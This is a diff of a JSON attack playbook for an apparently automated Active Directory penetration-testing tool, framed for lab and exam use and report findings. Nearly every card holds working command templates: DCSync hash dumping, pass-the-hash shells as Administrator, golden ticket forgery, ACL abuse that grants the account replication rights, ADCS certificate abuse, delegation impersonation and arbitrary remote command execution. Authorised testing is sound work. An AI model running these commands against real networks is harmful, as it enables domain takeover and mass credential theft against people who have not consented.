+   "hypothesis": "An account holding replication rights (GetChanges plus GetChangesAll, Domain Admins, and any account handed them through ACL abuse) can request that a DC replicate password data, with no logon to the DC needed. This is where most AD paths finish: abuse ACLs to award yourself replication rights, then sync.",
    "tool": "impacket-secretsdump",
    "tools": [
     "impacket-secretsdump",
@@ -1083,7 +1083,7 @@
    ],
    "priority": 96,
    "proves": "produces NTDS secrets and the krbtgt hash",
-   "does_not_prove": "crackable or reusable material — not a validated credential until it is cracked or otherwise validated",
+   "does_not_prove": "crackable or reusable material, not a validated credential until it is cracked or otherwise validated",
    "report": {
     "finding": "Domain Replication Rights Abuse (DCSync)",
     "severity": "critical"
@@ -1096,12 +1096,12 @@
     {
      "tool": "impacket-secretsdump",
      "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}} -just-dc",
-     "note": "PREFERRED cash-in: a full DRSUAPI sync — every hash in the domain, krbtgt among them (golden ticket material). -just-dc forces the replication path (no local SAM/LSA read first). No interactive prompt, no DC-side artifact. Guard this file; it is the report evidence itself. PREREQUISITE if you got here via ACL abuse (not a Domain Admin): your account must ALREADY hold the two replication ACEs. Run the ACL move's `add dcsync <you>` card FIRST and re-authenticate, then this. Getting rpc_s_access_denied or DRSR code 0x20f7 (ERROR_DS_DRA_BAD_DN) means those rights are not on your account yet — joining a WriteDACL group (e.g. Exchange Windows Permissions) only lets you GRANT them; it is not the grant itself."
+     "note": "PREFERRED cash-in: a full DRSUAPI sync, every hash in the domain, krbtgt among them (golden ticket material). -just-dc forces the replication path (no local SAM/LSA read first). No interactive prompt, no DC-side artifact. Guard this file; it is the report evidence itself. PREREQUISITE if you got here via ACL abuse (not a Domain Admin): your account must ALREADY hold the two replication ACEs. Run the ACL move's `add dcsync <you>` card FIRST and re-authenticate, then this. Getting rpc_s_access_denied or DRSR code 0x20f7 (ERROR_DS_DRA_BAD_DN) means those rights are not on your account yet, joining a WriteDACL group (e.g. Exchange Windows Permissions) only lets you GRANT them; it is not the grant itself."
     },
     {
      "tool": "impacket-secretsdump",
      "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}} -just-dc-user administrator",
-     "note": "A replication-based extraction of one account — quieter than the full sync when you only need the Administrator hash to pass-the-hash."
+     "note": "A replication-based extraction of one account, quieter than the full sync when you only need the Administrator hash to pass-the-hash."
     },
     {
      "tool": "mimikatz",
@@ -1111,14 +1111,14 @@
     {
      "tool": "nxc",
      "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' --ntds",
-     "note": "Same DRSUAPI replication with less typing, BUT on newer Windows nxc prompts an interactive [Y/N] ('dumping the ntds can crash the DC') that STALLS an unattended run, and it has been seen to fail with DRSR ERROR_DS_DRA_BAD_DN where impacket-secretsdump succeeds — prefer secretsdump for DCSync. Append --ntds vss for the shadow-copy approach; krbtgt in the output means golden-ticket material."
+     "note": "Same DRSUAPI replication with less typing, BUT on newer Windows nxc prompts an interactive [Y/N] ('dumping the ntds can crash the DC') that STALLS an unattended run, and it has been seen to fail with DRSR ERROR_DS_DRA_BAD_DN where impacket-secretsdump succeeds, prefer secretsdump for DCSync. Append --ntds vss for the shadow-copy approach; krbtgt in the output means golden-ticket material."
     }
    ]
   },
   {
    "id": "own-domain-pth",
-   "title": "Own the Domain — Pass-the-Hash as Administrator",
-   "hypothesis": "A completed DCSync / NTDS dump handed you every domain hash, the built-in Administrator (RID 500) among them. There is nothing left to crack: pass that NT hash straight into a login and you ARE Domain Administrator. Confirm it, take an interactive shell, and read the flags — this is the box.",
+   "title": "Own the Domain, Pass-the-Hash as Administrator",
+   "hypothesis": "A completed DCSync / NTDS dump handed you every domain hash, the built-in Administrator (RID 500) among them. There is nothing left to crack: pass that NT hash straight into a login and you ARE Domain Administrator. Confirm it, take an interactive shell, and read the flags, this is the box.",
    "tool": "evil-winrm",
    "tools": [
     "evil-winrm",
@@ -1139,7 +1139,7 @@
    ],
    "autonomy": "approve",
    "priority": 99,
-   "proves": "domain compromise — an interactive session as the built-in Administrator via pass-the-hash",
+   "proves": "domain compromise, an interactive session as the built-in Administrator via pass-the-hash",
    "does_not_prove": "",
    "report": {
     "finding": "Full Domain Compromise (Pass-the-Hash as Administrator)",
@@ -1153,13 +1153,13 @@
     {
      "tool": "nxc",
      "run": "nxc smb {{target}} -u administrator -H {{nthash}}",
-     "note": "Confirm the dumped Administrator NT hash authenticates — expect (Pwn3d!). Select the Administrator credential (the one obol pulled from your NTDS dump) on the left so {{nthash}} fills; -H passes the hash, no password needed."
+     "note": "Confirm the dumped Administrator NT hash authenticates, expect (Pwn3d!). Select the Administrator credential (the one obol pulled from your NTDS dump) on the left so {{nthash}} fills; -H passes the hash, no password needed."
     },
     {
      "tool": "evil-winrm",
      "run": "evil-winrm -i {{target}} -u administrator -H {{nthash}}",
      "win": true,
-     "note": "Interactive shell as Administrator over WinRM — pure pass-the-hash, no plaintext. Paste the session banner back so obol marks the WinRM foothold; the 'Hunt for flags (Windows)' move then reads the proof files your lab/exam profile grades on. If 5985/WinRM is closed, use the psexec/wmiexec variants below."
+     "note": "Interactive shell as Administrator over WinRM, pure pass-the-hash, no plaintext. Paste the session banner back so obol marks the WinRM foothold; the 'Hunt for flags (Windows)' move then reads the proof files your lab/exam profile grades on. If 5985/WinRM is closed, use the psexec/wmiexec variants below."
     },
     {
      "tool": "impacket-psexec",
@@ -1171,7 +1171,7 @@
   {
    "id": "lateral-exec",
    "title": "Authenticated Remote Execution",
-   "hypothesis": "Valid credentials carrying local admin rights get you code execution: psexec (service-based), wmiexec (quieter, semi-interactive), or WinRM through evil-winrm (a full shell on port 5985). Even with just an NTLM hash, pass-the-hash behaves the same way — you seldom need the plaintext.",
+   "hypothesis": "Valid credentials carrying local admin rights get you code execution: psexec (service-based), wmiexec (quieter, semi-interactive), or WinRM through evil-winrm (a full shell on port 5985). Even with just an NTLM hash, pass-the-hash behaves the same way, you seldom need the plaintext.",
    "tool": "evil-winrm",
    "tools": [
     "evil-winrm",
@@ -1195,7 +1195,7 @@
    ],
    "priority": 92,
    "proves": "produces a Windows foothold and administrative access",
-   "does_not_prove": "administrative access on this host or context — not control of the domain unless that is demonstrated on its own",
+   "does_not_prove": "administrative access on this host or context, not control of the domain unless that is demonstrated on its own",
    "report": {
     "finding": "Lateral Movement via Exposed Credentials",
     "severity": "high"
@@ -1209,27 +1209,27 @@
     {
      "tool": "nxc",
      "run": "nxc smb {{target}} -u {{user}} -p '{{password}}'",
-     "note": "Start by validating the credential and seeing what is owned. Replace {{target}} with a subnet (10.10.11.0/24) or a targets file to test every host at once — [+] marks a valid credential, Pwn3d! marks local admin."
+     "note": "Start by validating the credential and seeing what is owned. Replace {{target}} with a subnet (10.10.11.0/24) or a targets file to test every host at once, [+] marks a valid credential, Pwn3d! marks local admin."
     },
     {
      "tool": "nxc",
      "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -x '{{command}}'",
-     "note": "Execute any command on the host WITHOUT logging in — runs over WMI by default, dropping no service. The web crafter's 'run on host' menu fills {{command}} (whoami, systeminfo, net user…) and you can edit it freely; string together whatever you need: pull files, add users, stage payloads."
+     "note": "Execute any command on the host WITHOUT logging in, runs over WMI by default, dropping no service. The web crafter's 'run on host' menu fills {{command}} (whoami, systeminfo, net user…) and you can edit it freely; string together whatever you need: pull files, add users, stage payloads."
     },
     {
      "tool": "nxc",
      "run": "nxc winrm {{target}} -u {{user}} -p '{{password}}' -X '{{command}}'",
-     "note": "The WinRM version — zero SMB service artifacts, output over 5985. CAVEAT: on some nxc builds `nxc winrm -x/-X` crashes with `zip() argument 2 is longer than argument 1` (seen in testing) and returns nothing; if that happens, use `nxc smb -x` (wmiexec, above), impacket-wmiexec, or evil-winrm for command exec — they were reliable on the same box."
+     "note": "The WinRM version, zero SMB service artifacts, output over 5985. CAVEAT: on some nxc builds `nxc winrm -x/-X` crashes with `zip() argument 2 is longer than argument 1` (seen in testing) and returns nothing; if that happens, use `nxc smb -x` (wmiexec, above), impacket-wmiexec, or evil-winrm for command exec, they were reliable on the same box."
     },
     {
      "tool": "powershell",
      "run": "Enter-PSSession -ComputerName {{target}} -Credential $cred",
-     "note": "Native PSRemoting — construct $cred with PSCredential (see the writedacl-dcsync card), or launch from a pth-spawned shell to bypass credentials altogether."
+     "note": "Native PSRemoting, construct $cred with PSCredential (see the writedacl-dcsync card), or launch from a pth-spawned shell to bypass credentials altogether."
     },
     {
      "tool": "psexec",
      "run": ".\\PsExec.exe \\\\{{target}} cmd",
-     "note": "Sysinternals PsExec run from Windows inherits your present logon or an injected hash context — no password on the command line."
+     "note": "Sysinternals PsExec run from Windows inherits your present logon or an injected hash context, no password on the command line."
     },
     {
      "tool": "evil-winrm",
@@ -1244,7 +1244,7 @@
     {
      "tool": "impacket-psexec",
      "run": "impacket-psexec -hashes ':{{nthash}}' {{user}}@{{target}}",
-     "note": "The pass-the-hash form — no plaintext required."
+     "note": "The pass-the-hash form, no plaintext required."
     },
     {
      "tool": "impacket-wmiexec",
@@ -1256,7 +1256,7 @@
   {
    "id": "adcs-esc",
    "title": "ADCS Misconfiguration Abuse (ESC1-11)",
-   "hypothesis": "When Active Directory Certificate Services exposes vulnerable templates or endpoints, a certificate becomes a credential for any identity. certipy find -vulnerable names the ESC number; the abuse depends on which: ESC1 (enrollee-supplied SAN), ESC8 (relay NTLM auth to the CA web endpoint — pair it with coercion), ESC9/10 (no-security-extension + weak mapping), ESC11 (relay to the CA RPC endpoint). Authenticate with the issued cert to recover a TGT and NT hash.",
+   "hypothesis": "When Active Directory Certificate Services exposes vulnerable templates or endpoints, a certificate becomes a credential for any identity. certipy find -vulnerable names the ESC number; the abuse depends on which: ESC1 (enrollee-supplied SAN), ESC8 (relay NTLM auth to the CA web endpoint, pair it with coercion), ESC9/10 (no-security-extension + weak mapping), ESC11 (relay to the CA RPC endpoint). Authenticate with the issued cert to recover a TGT and NT hash.",
    "tool": "certipy",
    "tools": [
     "certipy",
@@ -1279,7 +1279,7 @@
    ],
    "priority": 78,
    "proves": "identifies a vulnerable ADCS template and certificate material",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "ADCS Template Misconfiguration",
     "severity": "critical"
@@ -1293,7 +1293,7 @@
     {
      "tool": "certipy",
      "run": "certipy find -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -vulnerable",
-     "note": "List templates and CAs; -vulnerable narrows it to exploitable setups. Study the output closely — it tells you the ESC number."
+     "note": "List templates and CAs; -vulnerable narrows it to exploitable setups. Study the output closely, it tells you the ESC number."
     },
     {
      "tool": "certipy",
@@ -1313,14 +1313,14 @@
     {
      "tool": "certipy",
      "run": "certipy account update -u {{user}}@{{domain}} -p '{{password}}' -user victim -upn administrator@{{domain}}",
-     "note": "ESC9/10: with write over a victim (no szOID_NTDS_CA_SECURITY_EXT enforcement), set its UPN to administrator, enroll, then reset the UPN — the cert maps to administrator."
+     "note": "ESC9/10: with write over a victim (no szOID_NTDS_CA_SECURITY_EXT enforcement), set its UPN to administrator, enroll, then reset the UPN, the cert maps to administrator."
     }
    ]
   },
   {
    "id": "cert-authenticate",
    "title": "Authenticate with a certificate (PKINIT → NT hash)",
-   "hypothesis": "A certificate issued for a principal — whether from ADCS ESC abuse or shadow credentials — authenticates as that principal via PKINIT. certipy auth returns a TGT and, through UnPAC-the-hash, the account's NT hash. This is the step that converts certificate material into a validated credential you can genuinely log in with.",
+   "hypothesis": "A certificate issued for a principal (whether from ADCS ESC abuse or shadow credentials) authenticates as that principal via PKINIT. certipy auth returns a TGT and, through UnPAC-the-hash, the account's NT hash. This is the step that converts certificate material into a validated credential you can genuinely log in with.",
    "tool": "certipy",
    "tools": [
     "certipy",
@@ -1355,7 +1355,7 @@
     {
      "tool": "certipy",
      "run": "certipy auth -pfx {{pfx}} -dc-ip {{target}}",
-     "note": "PKINIT using the .pfx that O.B.O.L verified — it returns a TGT (written to a .ccache) and, through UnPAC-the-hash, the NT hash. O.B.O.L populates {{pfx}} from the credential.certificate fact; a recovered or cracked hash becomes credential.available."
+     "note": "PKINIT using the .pfx that O.B.O.L verified, it returns a TGT (written to a .ccache) and, through UnPAC-the-hash, the NT hash. O.B.O.L populates {{pfx}} from the credential.certificate fact; a recovered or cracked hash becomes credential.available."
     },
     {
      "tool": "certipy",
@@ -1393,7 +1393,7 @@
    ],
    "priority": 78,
    "proves": "produces certificate material",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "Shadow Credentials via Object Write Access",
     "severity": "high"
@@ -1406,7 +1406,7 @@
     {
      "tool": "pywhisker",
      "run": "pywhisker.py -d {{domain}} -u {{user}} -p {{password}} --target {{target_sam}} --action list",
-     "note": "List the existing key credentials first — confirm your assumption about write access."
+     "note": "List the existing key credentials first, confirm your assumption about write access."
     },
     {
      "tool": "pywhisker",
@@ -1418,7 +1418,7 @@
   {
    "id": "delegation-abuse",
    "title": "Kerberos Delegation Abuse",
-   "hypothesis": "Delegation allows services to act on behalf of users. With unconstrained delegation, a host caches the TGT of everyone who connects — force the DC to connect to it (PetitPotam) and you own the DC's TGT. With constrained delegation or RBCD, abuse write access to set msDS-AllowedToActOnBehalfOfOtherIdentity and impersonate anyone to the target service.",
+   "hypothesis": "Delegation allows services to act on behalf of users. With unconstrained delegation, a host caches the TGT of everyone who connects, force the DC to connect to it (PetitPotam) and you own the DC's TGT. With constrained delegation or RBCD, abuse write access to set msDS-AllowedToActOnBehalfOfOtherIdentity and impersonate anyone to the target service.",
    "tool": "rubeus",
    "tools": [
     "rubeus",
@@ -1443,7 +1443,7 @@
    ],
    "priority": 86,
    "proves": "creates a machine account you control and/or grabs a Kerberos ticket (RBCD or unconstrained delegation)",
-   "does_not_prove": "access — a captured ticket is reusable material, not a validated credential or a foothold until you actually use it",
+   "does_not_prove": "access, a captured ticket is reusable material, not a validated credential or a foothold until you actually use it",
    "report": {
     "finding": "Kerberos Delegation Abuse Path",
     "severity": "critical"
@@ -1470,7 +1470,7 @@
   {
    "id": "golden-ticket",
    "title": "Golden Ticket (Post-Domain-Admin)",
-   "hypothesis": "Holding the krbtgt hash (from DCSync or NTDS) lets you forge TGTs for any user with any group membership — persistence that outlives password resets on every account but krbtgt itself. It is post-compromise proof and persistence, not a way in.",
+   "hypothesis": "Holding the krbtgt hash (from DCSync or NTDS) lets you forge TGTs for any user with any group membership, persistence that outlives password resets on every account but krbtgt itself. It is post-compromise proof and persistence, not a way in.",
    "tool": "impacket-ticketer",
    "tools": [
     "impacket-ticketer"
@@ -1490,7 +1490,7 @@
    ],
    "priority": 96,
    "proves": "produces domain persistence",
-   "does_not_prove": "persistence — achievable only when you already control the domain",
+   "does_not_prove": "persistence, achievable only when you already control the domain",
    "report": {
     "finding": "Domain Persistence via Golden Ticket",
     "severity": "critical"
@@ -1503,14 +1503,14 @@
     {
      "tool": "impacket-ticketer",
      "run": "impacket-ticketer -nthash {{krbtgt_hash}} -domain-sid {{domain_sid}} -domain {{domain}} administrator",
-     "note": "Forge a TGT. -nthash MUST be the krbtgt account's NT hash (from the DCSync/NTDS dump), not your own — obol fills it from the hash.krbtgt fact; if it is still {{krbtgt_hash}}, DCSync first. Obtain the domain SID with lookupsid or BloodHound. Export the ccache, then supply -k flags to impacket tools."
+     "note": "Forge a TGT. -nthash MUST be the krbtgt account's NT hash (from the DCSync/NTDS dump), not your own, obol fills it from the hash.krbtgt fact; if it is still {{krbtgt_hash}}, DCSync first. Obtain the domain SID with lookupsid or BloodHound. Export the ccache, then supply -k flags to impacket tools."
     }
    ]
   },
   {
    "id": "trust-enum",
    "title": "Trust Relationships & Forest Hopping",
-   "hypothesis": "Domains and forests joined by trusts can authenticate one another's users — and misconfigured trusts turn one owned domain into two. Enumerate trusts after gaining any domain foothold; BloodHound charts them, and cross-domain group membership (a domain A user sitting in a privileged domain B group) is the classic pivot.",
+   "hypothesis": "Domains and forests joined by trusts can authenticate one another's users, and misconfigured trusts turn one owned domain into two. Enumerate trusts after gaining any domain foothold; BloodHound charts them, and cross-domain group membership (a domain A user sitting in a privileged domain B group) is the classic pivot.",
    "tool": "nltest",
    "tools": [
     "nltest",
@@ -1532,7 +1532,7 @@
    ],
    "priority": 70,
    "proves": "identifies domain trusts",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "Exploitable Domain Trust Relationship",
     "severity": "high"
@@ -1559,7 +1559,7 @@
   {
    "id": "zerologon-check",
    "title": "Zerologon Check (CVE-2020-1472)",
-   "hypothesis": "Zerologon lets an unauthenticated attacker on the network reset a DC's machine-account password and seize the domain. The CHECK is harmless — it verifies the patch level without altering anything — and it gates the (destructive) exploit action, which resets the DC machine password and MUST restore it afterward. Run the check first; document the result either way.",
+   "hypothesis": "Zerologon lets an unauthenticated attacker on the network reset a DC's machine-account password and seize the domain. The CHECK is harmless (it verifies the patch level without altering anything) and it gates the (destructive) exploit action, which resets the DC machine password and MUST restore it afterward. Run the check first; document the result either way.",
    "tool": "zerologon-scan",
    "tools": [
     "zerologon-scan"
@@ -1580,7 +1580,7 @@
    ],
    "priority": 55,
    "proves": "identifies candidate vulnerabilities",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "Zerologon Vulnerability (CVE-2020-1472)",
     "severity": "critical"
@@ -1599,7 +1599,7 @@
   {
    "id": "wsus-abuse",
    "title": "WSUS Abuse",
-   "hypothesis": "WSUS servers distribute updates to every Windows machine in the domain — over cleartext HTTP where they are misconfigured. Relay or MITM that update channel and you can deliver a bogus \"update\" (SharpWSUS/WSUSpendu) that executes as SYSTEM on each client that checks in. Go looking for WSUS whenever you have a relay position or an already-compromised server.",
+   "hypothesis": "WSUS servers distribute updates to every Windows machine in the domain, over cleartext HTTP where they are misconfigured. Relay or MITM that update channel and you can deliver a bogus \"update\" (SharpWSUS/WSUSpendu) that executes as SYSTEM on each client that checks in. Go looking for WSUS whenever you have a relay position or an already-compromised server.",
    "tool": "sharpwsus",
    "tools": [
     "sharpwsus"
@@ -1620,7 +1620,7 @@
    ],
    "priority": 96,
    "proves": "produces SYSTEM access and domain persistence",
-   "does_not_prove": "SYSTEM on this one host — not control across the whole domain",
+   "does_not_prove": "SYSTEM on this one host, not control across the whole domain",
    "report": {
     "finding": "WSUS Update Channel Abuse",
     "severity": "critical"
@@ -1644,7 +1644,7 @@
   {
    "id": "sccm-enum",
    "title": "SCCM/MECM Enumeration & Abuse",
-   "hypothesis": "SCCM oversees software deployment across the entire fleet — take it over and you can push code to everything as SYSTEM. Even short of that, enumerating SCCM leaks credentials (network access accounts, task sequences with baked-in passwords) through LDAP and the site's SMB shares. SharpSCCM and sccmhunter are the relevant toolkits.",
+   "hypothesis": "SCCM oversees software deployment across the entire fleet, take it over and you can push code to everything as SYSTEM. Even short of that, enumerating SCCM leaks credentials (network access accounts, task sequences with baked-in passwords) through LDAP and the site's SMB shares. SharpSCCM and sccmhunter are the relevant toolkits.",
    "tool": "sccmhunter",
    "tools": [
     "sccmhunter",
@@ -1667,7 +1667,7 @@
    ],
    "priority": 84,
    "proves": "surfaces candidate credentials and attack paths",
-   "does_not_prove": "candidate material only — not yet a validated credential, and not access",
+   "does_not_prove": "candidate material only, not yet a validated credential, and not access",
    "report": {
     "finding": "SCCM Credential Exposure",
     "severity": "high"
@@ -1679,12 +1679,12 @@
     {
      "tool": "sccmhunter",
      "run": "sccmhunter.py find -u {{user}} -p '{{password}}' -d {{domain}} -dc-ip {{target}}",
-     "note": "Find SCCM site servers and management points via LDAP. sccmhunter takes the bare username in -u and the domain separately in -d (it errors 'Missing option -d' otherwise). No SCCM in the environment? This simply finds nothing — it is not a foothold on every box."
+     "note": "Find SCCM site servers and management points via LDAP. sccmhunter takes the bare username in -u and the domain separately in -d (it errors 'Missing option -d' otherwise). No SCCM in the environment? This simply finds nothing, it is not a foothold on every box."
     },
     {
      "tool": "sccmhunter",
      "run": "sccmhunter.py smb -u {{user}} -p '{{password}}' -d {{domain}} -dc-ip {{target}}",
-     "note": "Enumerate the SCCM shares — this is where task sequences and scripts with embedded credentials reside. Bare username in -u, domain in -d."
+     "note": "Enumerate the SCCM shares, this is where task sequences and scripts with embedded credentials reside. Bare username in -u, domain in -d."
     }
    ]
   },
@@ -1715,7 +1715,7 @@
    ],
    "priority": 74,
    "proves": "produces deep enumeration and candidate credentials",
-   "does_not_prove": "candidate material only — not yet a validated credential, and not access",
+   "does_not_prove": "candidate material only, not yet a validated credential, and not access",
    "report": {
     "finding": "Credential Access and Reuse via SMB/WinRM",
     "severity": "high"
@@ -1743,7 +1743,7 @@
     {
      "tool": "nxc",
      "run": "nxc ldap {{target}} -u {{user}} -p {{password}} --asreproast {{hashfile}}",
-     "note": "AS-REP roasting through nxc — no Impacket required."
+     "note": "AS-REP roasting through nxc, no Impacket required."
     },
     {
      "tool": "nxc",
@@ -1763,7 +1763,7 @@
     {
      "tool": "nxc",
      "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -x \"whoami\"",
-     "note": "An execution check over WinRM — proves shell-level access without opening a full session."
+     "note": "An execution check over WinRM, proves shell-level access without opening a full session."
     }
    ]
   },
@@ -1796,7 +1796,7 @@
    ],
    "priority": 78,
    "proves": "produces Kerberos tickets",
-   "does_not_prove": "context and enumeration only — no access, credential, or privilege",
+   "does_not_prove": "context and enumeration only, no access, credential, or privilege",
    "report": {
     "finding": "",
     "severity": "informational"
@@ -1819,7 +1819,7 @@
     {
      "tool": "impacket-getTGT",
      "run": "impacket-getTGT -hashes ':{{nthash}}' '{{domain}}/{{user}}'",
-     "note": "The hash form — the same ticket without needing a password."
+     "note": "The hash form, the same ticket without needing a password."
     },
     {
      "tool": "sh",
@@ -1836,7 +1836,7 @@
   {
    "id": "bloodyad-acl",
    "title": "ACL Abuse with bloodyAD",
-   "hypothesis": "In modern AD, the privilege paths are ACL paths: GenericAll, WriteDacl, WriteOwner, or group-membership write rights on an object let you escalate by editing the directory itself — join groups, seize ownership, grant yourself control, force password resets, or plant shadow credentials. BloodHound reveals which edges you possess; bloodyAD carries them out from Linux with no RSAT.",
+   "hypothesis": "In modern AD, the privilege paths are ACL paths: GenericAll, WriteDacl, WriteOwner, or group-membership write rights on an object let you escalate by editing the directory itself, join groups, seize ownership, grant yourself control, force password resets, or plant shadow credentials. BloodHound reveals which edges you possess; bloodyAD carries them out from Linux with no RSAT.",
    "tool": "bloodyad",
    "tools": [
     "bloodyad",
@@ -1860,7 +1860,7 @@
    ],
    "priority": 84,
    "proves": "produces object-control paths and candidate credentials",
-   "does_not_prove": "candidate material only — not yet a validated credential, and not access",
+   "does_not_prove": "candidate material only, not yet a validated credential, and not access",
    "report": {
     "finding": "ACL-Based Privilege Escalation Path",
     "severity": "high"
@@ -1874,24 +1874,24 @@
      "tool": "bloodyad",
      "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail",
      "web": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail | tee {{scandir}}/bloodyad-writable.txt",
-     "web_note": "In a large domain --detail can run to tens of thousands of lines — too many to paste. It writes to scans/bloodyad-writable.txt (shown); attach that file in Evidence — obol only needs the writable-object lines.",
+     "web_note": "In a large domain --detail can run to tens of thousands of lines, too many to paste. It writes to scans/bloodyad-writable.txt (shown); attach that file in Evidence, obol only needs the writable-object lines.",
      "note": "Begin here: what can your account genuinely write to? The detailed output is your menu of options."
     },
     {
      "tool": "bloodyad",
      "run": "for g in {{abuse_groups_quoted}}; do bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add groupMember \"$g\" {{user}} 2>/dev/null && echo \"[+] JOINED: $g\"; done",
-     "note": "Fire on every reasonable group at once — obol fills the list with the high-value groups you can write to (or the usual suspects when the lead is thin), so you don't have to guess which one is the path. Any line that prints '[+] JOINED' is a group you now belong to; RE-AUTHENTICATE (fresh login / new ticket), then run the `add dcsync` card — a membership like Exchange Windows Permissions grants WriteDACL over the domain object, which is what makes DCSync stick. Paste the whole output back here and obol records each group you joined."
+     "note": "Fire on every reasonable group at once, obol fills the list with the high-value groups you can write to (or the usual suspects when the lead is thin), so you don't have to guess which one is the path. Any line that prints '[+] JOINED' is a group you now belong to; RE-AUTHENTICATE (fresh login / new ticket), then run the `add dcsync` card, a membership like Exchange Windows Permissions grants WriteDACL over the domain object, which is what makes DCSync stick. Paste the whole output back here and obol records each group you joined."
     },
     {
      "tool": "bloodyad",
      "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add groupMember \"{{group}}\" {{user}}",
-     "note": "The winning add: obol fills {{group}} with the highest-value group you can write to — a group whose membership hands you domain control (e.g. Exchange Windows Permissions → WriteDACL over the domain → DCSync), not merely the first one enumerated. Add yourself, then RE-AUTHENTICATE (new login / fresh ticket) so the membership takes effect, then run the `add dcsync` card below and secretsdump the Administrator hash. If bloodyAD reports the add succeeded but the next step is still denied, you have not re-authenticated yet."
+     "note": "The winning add: obol fills {{group}} with the highest-value group you can write to, a group whose membership hands you domain control (e.g. Exchange Windows Permissions → WriteDACL over the domain → DCSync), not merely the first one enumerated. Add yourself, then RE-AUTHENTICATE (new login / fresh ticket) so the membership takes effect, then run the `add dcsync` card below and secretsdump the Administrator hash. If bloodyAD reports the add succeeded but the next step is still denied, you have not re-authenticated yet."
     },
     {
      "tool": "bloodyad",
      "win": true,
      "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add dcsync {{user}}",
-     "note": "Run this next, right after you joined a group that holds WriteDACL over the domain (e.g. Exchange Windows Permissions). It writes the two DS-Replication ACEs (GetChanges + GetChangesAll) onto the domain object for your account — which lets you DCSync every hash in the domain and own it. RE-AUTHENTICATE first if you just joined the group, then run this, then the `dcsync` card (impacket-secretsdump) below. Skipping this is why secretsdump returns rpc_s_access_denied / DRSR ERROR_DS_DRA_BAD_DN — you must grant the rights before you can replicate. Name any principal you control in place of {{user}}."
+     "note": "Run this next, right after you joined a group that holds WriteDACL over the domain (e.g. Exchange Windows Permissions). It writes the two DS-Replication ACEs (GetChanges + GetChangesAll) onto the domain object for your account, which lets you DCSync every hash in the domain and own it. RE-AUTHENTICATE first if you just joined the group, then run this, then the `dcsync` card (impacket-secretsdump) below. Skipping this is why secretsdump returns rpc_s_access_denied / DRSR ERROR_DS_DRA_BAD_DN, you must grant the rights before you can replicate. Name any principal you control in place of {{user}}."
     },
     {
      "tool": "impacket-dacledit",
@@ -1901,12 +1901,12 @@
     {
      "tool": "bloodyad",
      "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' set owner \"{{target_sam}}\" {{user}}",
-     "note": "A WriteOwner edge (a DIFFERENT primitive — not the DCSync path). Take ownership of a specific object when your lead is WriteOwner over it, then grant yourself control over that object below. Owning a group is not the same as replication rights — for DCSync use the `add dcsync` card above."
+     "note": "A WriteOwner edge (a DIFFERENT primitive, not the DCSync path). Take ownership of a specific object when your lead is WriteOwner over it, then grant yourself control over that object below. Owning a group is not the same as replication rights, for DCSync use the `add dcsync` card above."
     },
     {
      "tool": "bloodyad",
      "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add genericAll \"{{target_sam}}\" {{user}}",
-     "note": "Award yourself GenericAll over an object you own or can write the DACL of. From there you can reset its password, targeted-Kerberoast it, or add shadow credentials — the route when the target is a USER/computer rather than a WriteDACL-over-domain group."
+     "note": "Award yourself GenericAll over an object you own or can write the DACL of. From there you can reset its password, targeted-Kerberoast it, or add shadow credentials, the route when the target is a USER/computer rather than a WriteDACL-over-domain group."
     },
     {
      "tool": "impacket-dacledit",
@@ -1918,7 +1918,7 @@
   {
    "id": "getst-impersonation",
    "title": "S4U Impersonation (getST)",
-   "hypothesis": "Constrained delegation and resource-based constrained delegation allow a service account to request service tickets as ANY user — Administrator included — through the S4U2self and S4U2proxy extensions. getST -impersonate is the payoff for the entire delegation track: it converts delegation rights into a cifs/host ticket as admin on the target.",
+   "hypothesis": "Constrained delegation and resource-based constrained delegation allow a service account to request service tickets as ANY user (Administrator included) through the S4U2self and S4U2proxy extensions. getST -impersonate is the payoff for the entire delegation track: it converts delegation rights into a cifs/host ticket as admin on the target.",
    "tool": "impacket-getST",
    "tools": [
     "impacket-getST"
@@ -1939,7 +1939,7 @@
    ],
    "priority": 92,
    "proves": "produces Kerberos tickets and administrative access",
-   "does_not_prove": "administrative access on this host or context — not control of the domain unless that is demonstrated on its own",
+   "does_not_prove": "administrative access on this host or context, not control of the domain unless that is demonstrated on its own",
    "report": {
     "finding": "Delegation-Based Impersonation to Administrator",
     "severity": "critical"
@@ -1961,14 +1961,14 @@
     {
      "tool": "sh",
      "run": "export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass '{{spn_host}}'",
-     "note": "Put the ticket to work with -k -no-pass. The host MUST be the exact FQDN you forged the SPN for above ({{spn_host}}) — Kerberos matches the ticket by SPN, so a SAM name or a bare IP silently fails with KRB_AP_ERR_* / no output."
+     "note": "Put the ticket to work with -k -no-pass. The host MUST be the exact FQDN you forged the SPN for above ({{spn_host}}), Kerberos matches the ticket by SPN, so a SAM name or a bare IP silently fails with KRB_AP_ERR_* / no output."
     }
    ]
   },
   {
    "id": "gmsa-read",
    "title": "gMSA Password Read",
